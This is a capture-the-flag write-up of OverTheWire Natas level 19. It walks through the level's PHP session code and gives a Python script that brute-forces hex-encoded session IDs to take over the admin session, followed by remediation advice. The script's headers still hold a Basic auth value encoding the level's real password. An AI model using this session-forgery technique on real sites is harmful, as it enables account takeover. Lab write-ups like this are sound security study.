# [Over The Wire (natas)] – [[Platform](http://natas19.natas.labs.overthewire.org/)] – [09/26/2025]

## Objective
Find the password for the next Natas level by exploiting the vulnerability on this page.  

## Environment / Platform
- Platform: OverTheWire – Natas
- Level: [19]
- Difficulty: [Medium]

## Tools Used
- Chromium Browser
- Burp Suite (proxy + repeater)
- Python

## Login
1. Logged in with credentials:
   - **Username**: `natas19
   - **Password**: `XXXXXX`
  
2. Screenshot:
   ![alt text](image-26.png)
   
   - this prompted that I should check the sourcecode by clicking the link `http://natas19.natas.labs.overthewire.org/index-source.html`

3. Observed Page Content
   ```php
      $maxid = 640; // 640 should be enough for everyone

      function myhex2bin($h) { /* {{{ */
      if (!is_string($h)) return null;
      $r='';
      for ($a=0; $a<strlen($h); $a+=2) { $r.=chr(hexdec($h[$a].$h[($a+1)])); }
      return $r;
      }
   ```
   - This function checks if the input is string and if not will return null, otherwise will run a loop that increments by 2 and is to have a double-pointer of the input string and splices them together and converts to from hex to decimal. Then converts decimal to ASCII character to return.
 
  
   ```php
      function isValidAdminLogin() { /* {{{ */
         if($_REQUEST["username"] == "admin") {
         /* This method of authentication appears to be unsafe and has been disabled for now. */
            //return 1;
         }

         return 0;
      }
   ```
   - This function checks if the username key-value is equal to "admin" and simingly does nothing then returns 0. 
  

   ```php
      function isValidID($id) { /* {{{ */
         // must be lowercase
         if($id != strtolower($id)) {
            return false;
         }

         // must decode
         $decoded = myhex2bin($id);

         // must contain a number and a username
         if(preg_match('/^(?P<id>\d+)-(?P<name>\w+)$/', $decoded, $matches)) {
            return true;
         }

         return false;
      }
   ```
   - This functions checks the input to be lowercase string if not then return false. The input is then decoded and then runs a regular expression search for id-name syntax on decoded and adds then to matches. 
  

   ```php
      function createID($user) { /* {{{ */
         global $maxid;
         $idnum = rand(1, $maxid);
         $idstr = "$idnum-$user";
         return bin2hex($idstr);
      }  
   ```
   - this function takes in input and creates a random number between one and the maxid globally possible. Then using default id string will return the encoded binary to hexadecimal.
  


   ```php
      function debug($msg) { /* {{{ */
         if(array_key_exists("debug", $_GET)) {
            print "DEBUG: $msg<br>";
         }
      }
   ```
   - This function takes in the input of message and if there is an key value "debug" will print out the message.
  

   ```php
      function my_session_start() { /* {{{ */
         if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
            if(!session_start()) {
                  debug("Session start failed");
                  return false;
            } else {
                  debug("Session start ok");
                  if(!array_key_exists("admin", $_SESSION)) {
                  debug("Session was old: admin flag set");
                  $_SESSION["admin"] = 0; // backwards compatible, secure
                  }
                  return true;
            }
         }

         return false;
      }
   ```
   - This session checks to see if the key 'PHPSESSID" exists within cookie and validates that the value is numeric. If the session doesn't start then sends a debug message stating so, otherwise sends a debug message stating it's ok. Also if the key value of "admin" doesn't exist reports with a debugging message and sets the key "admin" of Session to 0.

   ```php
      function print_credentials() { /* {{{ */
         if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
            print "You are an admin. The credentials for the next level are:<br>";
            print "<pre>Username: natas19\n";
            print "Password: <censored></pre>";
         } else {
            print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
         }
      }
   ```
   - This function checks to see if there is a Session and if session has the key-value of "admin" and if "admin" in session is equal to 1. If everything is true then prints out the flag, otherwise will print that the account is regular and not admin. 

   ```php
      $showform = true;
      if(my_session_start()) {
         print_credentials();
         $showform = false;
      } else {
         if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
            session_id(createID($_REQUEST["username"]));
            session_start();
            $_SESSION["admin"] = isValidAdminLogin();
            debug("New session started");
            $showform = false;
            print_credentials();
         }
      }

      if($showform) {
   ```
   - This logic block checks if the session starts and prints credentials and then makes form not visible. Otherwise checks if keys "username" and "password" exists in the request. If so, will create session id and start session. Session key "admin" is set to 0. Debugging message sent, form is hidden, and print credentials.  

---
  

     
1. Steps taken (session-ID enumeration):

   1. The logic is a little convoluted but it hangs on the id sent by the cookie with the key-value being "PHPSESSID" or PHP Session ID. 640 is the maximum so that leaves a small bruteforce attack possible. 

   2. The cookie this time is endcoded and decoded but follows a structure of `id-name`. The source-code suggest that it's hex2bin and bin2hex, although the hex2bin was implemented in php and native for some reason. 

   3. I attempted to use a test to login using admin & admin for credentials, this produced the cookie value of `3139302d61646d696e`.

   4. I wanted to double check what this hex value would look like in binary again, so I created a small python script to check.

   ```python

      def myhex2bin(h: str) -> bytes:
      r = b""
      for i in range(0, len(h), 2):
         r += bytes([int(h[i:i+2], 16)])
      return r

      def main():
         hex_input = input("Enter hex string: ")
         result = myhex2bin(hex_input)

         print("Decoded (raw bytes):", result)
         try:
            print("As text:", result.decode())
         except UnicodeDecodeError:
            print("As text: <non-printable characters>")


      if __name__ == "__main__":
         main()

   ```

   ![alt text](image-27.png)

   5. Then I wanted to see how I can reverse the process and get the hexadecimal from the string `190-admin, so I wrote another script. 

   ```python
      def bin2hex(h: str) -> bytes:
      # Convert to bytes
      binary_data = h.encode()  # str -> bytes

      # Convert to hex
      hex_output = binary_data.hex()

      print("Hex representation:", hex_output)

      def main():
         bin_input = input("Enter hex string: ")
         result = bin2hex(bin_input)

      if __name__ == "__main__":
      main()

   ```
   ![alt text](image-28.png)

   6. The process works without a hitch and was able to reproduce forwards and backwards. Now I just needed a way to check all 640 guesses bin2hex for the available ID's. 

   7. That's where I came up with yet another python script to build upon these 2 smaller scripts. 
   


   ```python
      import requests
      from requests.auth import HTTPBasicAuth


      def bin2hex(h: str) -> bytes:
         # Convert to bytes
         binary_data = h.encode()  # str -> bytes
         # Convert to hex
         hex_output = binary_data.hex()

         return hex_output

      def main():
         # --- Configuration ---
         url = "http://natas19.natas.labs.overthewire.org/"
         auth = HTTPBasicAuth("natas19", "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX")  # replace with actual

         headers = {
            "Cache-Control": "max-age=0",
            "Accept-Language": "en-US,en;q=0.9",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Authorization": "Basic bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg==",
            "Connection": "keep-alive",
            "Referer": "http://natas19.natas.labs.overthewire.org/",
         }


         for i in range(641):
            payload = bin2hex(f"{str(i)}-admin")
            cookies = {"PHPSESSID": payload}

            res = requests.get(url, auth=auth, headers=headers, cookies=cookies)

            if 'You are logged in as a regular user.' not in res.text:
                  print(f"Interesting session: {i}")
            else:
                  print(f"{i}")



      if __name__ == "__main__":
         main()
   ```
   
   8. This produced the flag.
   

---

🔑 **Why this works**: 

   - Custom myhex2bin is forgiving and operates on unvalidated input, allowing malformed or attacker-controlled cookies to be decoded silently.

   - Session identity is derived from predictable, low-entropy values (rand(1, $maxid) + username) and exposed as a hex-encoded cookie.

   - Small search space ($maxid = 640) makes brute-forcing all possible id-user combinations trivial.

   - session_id() is set directly from attacker-controlled value (cookie or created by createID), enabling session fixation / ID forgery.

   - isValidAdminLogin() authentication is disabled / returns 0, so admin status is controlled entirely by session state rather than server-side auth checks.

   - Debug output can leak internal state and aid enumeration when enabled.

   - my_session_start() accepts a session cookie if it matches isValidID() and then initializes $_SESSION["admin"], enabling privilege manipulation via crafted session IDs.

---

💥 **Impact**

   - Full privilege escalation to admin on the Natas instance — attacker can retrieve the next-level credentials/flag.

   - Complete takeover of any session whose ID is guessed or constructed (session impersonation).

   - Automated, low-cost brute-force or enumeration of all valid session IDs (640 attempts) yields high success probability.

   - Disclosure of sensitive information (next-level password) and potential leakage of other session-protected data.

   - Enables scripted exploitation (bots, scanners) with minimal effort due to predictable ID format and small keyspace.

   - Increased attack surface when debug mode is enabled (information disclosure).

---
  
🛠️ **Remediation**

   - Replace custom decoding with strict, native functions: use hex2bin() and check for false on failure.

   - Validate input thoroughly: require even-length hex, allowed character set ([0-9a-f]+), and explicit length limits before decoding.

   - Remove reliance on predictable session IDs; do not derive session IDs from user-controlled or low-entropy values. Use PHP’s native session generation or a cryptographically secure random ID.

   - Do not call session_id() with attacker-supplied values; create sessions server-side and regenerate IDs on privilege changes (session_regenerate_id()).

   - Enforce server-side authorization checks for admin actions (don’t rely solely on $_SESSION fields that can be forged).

   - Disable or gate debug output in production; never print internal messages to unauthenticated users.

   - Increase entropy/space if any token-like values must be user-visible, and rate-limit / log repeated session-ID checks to detect brute-force.

   - Set secure cookie attributes: HttpOnly, Secure, SameSite where appropriate.

   - Add monitoring/alerts for unusual session behavior (mass enumeration, repeated failures).